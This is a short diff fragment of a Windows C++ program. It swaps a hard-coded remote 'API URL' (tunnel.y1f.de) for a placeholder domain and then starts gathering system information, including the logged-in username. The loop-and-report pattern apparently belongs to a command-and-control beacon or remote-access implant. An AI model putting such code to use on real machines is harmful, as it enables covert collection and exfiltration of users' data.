@@ -263,7 +263,7 @@ int main() {
     do {
         try {
             // Define API URL
-            const char* URL = "http://tunnel.y1f.de";
+            const char* URL = "http://api.domain.tld";
 
             // Gather System Information
             std::string user = GetRegistryValue(HKEY_CURRENT_USER, L"Volatile Environment", L"USERNAME");
